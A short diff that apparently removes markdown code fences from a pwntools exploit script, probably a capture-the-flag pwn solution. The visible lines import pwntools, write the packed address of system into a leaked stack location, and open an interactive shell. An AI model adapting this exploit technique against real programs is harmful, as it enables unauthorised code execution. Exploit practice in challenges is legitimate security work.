@@ -1,4 +1,3 @@
-```python
 from pwn import *
 
 
@@ -160,4 +159,4 @@ write(p64(system)[::-1], stackleak-0x100+8+8+8+8)
 r.sendline("0")
 
 r.interactive()
-```
+
